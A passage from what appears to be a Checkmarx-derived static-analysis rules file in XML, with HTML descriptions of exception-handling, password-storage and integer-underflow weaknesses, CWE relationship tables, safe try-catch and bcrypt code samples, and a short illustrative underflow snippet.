&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_201_Relationships" id="oc_201_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;200&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=200" target="_blank"&gt;Information Exposure&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanAlsoBe&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;202&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=202" target="_blank"&gt;Privacy Leak through Data Queries&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanAlsoBe&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;209&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=209" target="_blank"&gt;Information Exposure Through an Error Message&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_201_Taxonomy Mappings" id="oc_201_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accidental leaking of sensitive information through sent
data&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_201_Related Attack Patterns" id="oc_201_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org12.html" target="_blank"&gt;12&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Choosing a Message/Channel Identifier on a Public/Multicast Channel&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_201_Content History" id="oc_201_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-10-29&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Other Notes,
Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_605</key><name>Improper_Exception_Handling</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;An attacker could maliciously cause an exception that could crash the application, potentially resulting in a denial of service (DoS).&lt;/li&gt;
&lt;li&gt;Inadvertent application crashes may occur.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some operation, such as database or file access, that could throw an exception. Since the application is not designed to properly handle the exception, the application could crash.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Any method that could cause an exception should be wrapped in a try-catch block that:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Explicitly handles expected exceptions&lt;/li&gt;
&lt;li&gt;Includes a default solution to explicitly handle unexpected exceptions&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Always catch exceptions explicitly.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SqlException ex)
{
// Handle exception
}
catch (Exception ex)
{
// Default handler for unexpected exceptions
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Always catch exceptions explicitly.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SQLException ex)
{
// Handle exception
}
catch (Exception ex)
{
// Default handler for unexpected exceptions
}


      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_610</key><name>Insufficiently_Protected_Credentials</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could steal user credentials, enabling access to user accounts and confidential data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;User passwords are written to the database without being properly encrypted with a cryptographic hash. The application reads clear passwords straight from the database.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Store passwords using a cryptographic hash designed as a password protection scheme, such as:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;bcrypt&lt;/li&gt;
&lt;li&gt;scrypt&lt;/li&gt;
&lt;li&gt;PBKDF2 (with random salt) These need to be configured with an appropriately high work effort.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Always use a secure password protection scheme to store passwords, such as bcrypt:

      &lt;/h4&gt;&lt;pre&gt;


string hashed = BCrypt.HashPassword(password, BCrypt.GenerateSalt(12));



      &lt;/pre&gt;&lt;h4&gt;

For password verification, use the matching function:

      &lt;/h4&gt;&lt;pre&gt;


bool isValid = BCrypt.CheckPassword(candidate, hashed);



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Always use a secure password protection scheme to store passwords, such as bcrypt:

      &lt;/h4&gt;&lt;pre&gt;


String hashed = BCrypt.hashpw(password, BCrypt.gensalt(12));


      &lt;/pre&gt;&lt;h4&gt;

For password verification, use the matching function:

      &lt;/h4&gt;&lt;pre&gt;


bool isValid = BCrypt.checkpw(candidate, hashed);


      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1650</key><name>Integer_Underflow</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Integer Underflow (Wrap or Wraparound)&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;191&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_191_Description" id="oc_191_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product subtracts one value from another, such that the
result is less than the minimum allowable integer value, which produces a value
that is not equal to the correct result.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;This can happen in signed and unsigned cases.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Alternate Terms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Alternate Terms&lt;/div&gt;&lt;div name="oc_191_Alternate Terms" id="oc_191_Alternate Terms" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Integer underflow:&lt;/th&gt;&lt;td valign="top" width="100%"&gt;

&lt;p&gt;"Integer underflow" is sometimes used to identify signedness errors in
which an originally positive number becomes negative as a result of
subtraction. However, there are cases of bad subtraction in which
unsigned integers are involved, so it's not always a signedness
issue.&lt;/p&gt;&lt;p&gt;"Integer underflow" is occasionally used to describe array index
errors in which the index is negative.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_191_Time of Introduction" id="oc_191_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_191_Applicable Platforms" id="oc_191_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;C&lt;/p&gt;
&lt;p&gt;C++&lt;/p&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;p&gt;.NET&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_191_Demonstrative Examples" id="oc_191_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following example has an integer underflow. The value of i is
already at the lowest negative value possible. The new value of i is
2147483647.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;#include &amp;lt;stdbool.h&amp;gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;main (void)&lt;/div&gt;&lt;div style="font-size:90%;"&gt;{&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;int i;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;unsigned int j = 0;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;i = -2147483648;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;i = i - 1;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;j = j - 1;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return 0;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_191_Observed Examples" id="oc_191_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0816" target="_blank"&gt;CVE-2004-0816&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Integer underflow in firewall via malformed
packet.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1002" target="_blank"&gt;CVE-2004-1002&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Integer underflow by packet with invalid
length.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0199" target="_blank"&gt;CVE-2005-0199&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Long input causes incorrect length
calculation.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1891" target="_blank"&gt;CVE-2005-1891&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Malformed icon causes integer underflow in loop
counter variable.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_191_Relationships" id="oc_191_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;682&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=682" target="_blank"&gt;Incorrect Calculation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Research Gaps"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Research Gaps&lt;/div&gt;&lt;div name="oc_191_Research Gaps" id="oc_191_Research Gaps" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Under-studied.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_191_Taxonomy Mappings" id="oc_191_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Integer underflow (wrap or wraparound)&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_191_Content History" id="oc_191_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Example&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Alternate Terms, Applicable Platforms,
